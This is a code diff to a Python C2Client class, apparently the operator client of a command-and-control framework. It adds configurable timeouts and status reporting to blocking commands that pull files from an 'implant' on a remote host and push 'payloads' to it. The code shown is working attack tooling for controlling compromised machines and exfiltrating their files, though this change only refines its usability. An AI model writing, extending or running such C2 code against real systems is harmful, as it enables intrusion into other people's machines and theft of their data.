@@ -142,7 +142,7 @@ class C2Client:
         info     = self._post_task(task)
         print(f"[*] file-get task {info[TASK_GUID_KEY]} queued (implant will push {remote_path})")
 
-    def cmd_get_wait(self, remote_path: str, dest_name: str = None):
+    def cmd_get_wait(self, remote_path: str, dest_name: str = None, timeout_s: int = 180):
         """Pull a file FROM the implant to the C2 server upload dir, block until complete."""
         if self.debug:
             print(f"[DBG] GET-W -> implant:{remote_path} -> C2 files/{dest_name or '(random)'}  (blocking)")
@@ -152,9 +152,16 @@ class C2Client:
             task["fileName"] = dest_name
         info     = self._post_task(task)
         print(f"[*] file-get task {info[TASK_GUID_KEY]} queued, waiting for upload ...")
-        self._poll_output(info[TASK_GUID_KEY], timeout_s=180)
+        output = self._poll_output(info[TASK_GUID_KEY], timeout_s=timeout_s)
+        if output is None:
+            print(f"[!] file-get: timed out or discarded — implant:{remote_path}")
+        elif output.strip():
+            print(f"[+] file-get complete: {output.strip()}")
+        else:
+            label = dest_name or remote_path.rsplit("\\", 1)[-1]
+            print(f"[+] file-get complete → C2 files/{label}")
 
-    def cmd_put_wait(self, payload_name: str, remote_dest: str):
+    def cmd_put_wait(self, payload_name: str, remote_dest: str, timeout_s: int = 180):
         """Push a file to the implant and block until transfer is complete."""
         if self.debug:
             print(f"[DBG] PUT-W -> payloads/{payload_name} -> implant:{remote_dest}  (blocking)")
@@ -163,7 +170,13 @@ class C2Client:
                     "args": remote_dest, "payload": payload_name}
         info     = self._post_task(task)
         print(f"[*] file-put task {info[TASK_GUID_KEY]} queued, waiting for transfer ...")
-        self._poll_output(info[TASK_GUID_KEY], timeout_s=180)
+        output = self._poll_output(info[TASK_GUID_KEY], timeout_s=timeout_s)
+        if output is None:
+            print(f"[!] file-put: timed out or discarded — implant:{remote_dest}")
+        elif output.strip():
+            print(f"[+] file-put complete: {output.strip()}")
+        else:
+            print(f"[+] file-put complete → implant:{remote_dest}")
 
     def cmd_put(self, payload_name: str, remote_dest: str):
         """Push a file FROM the C2 server payloads dir TO the implant."""
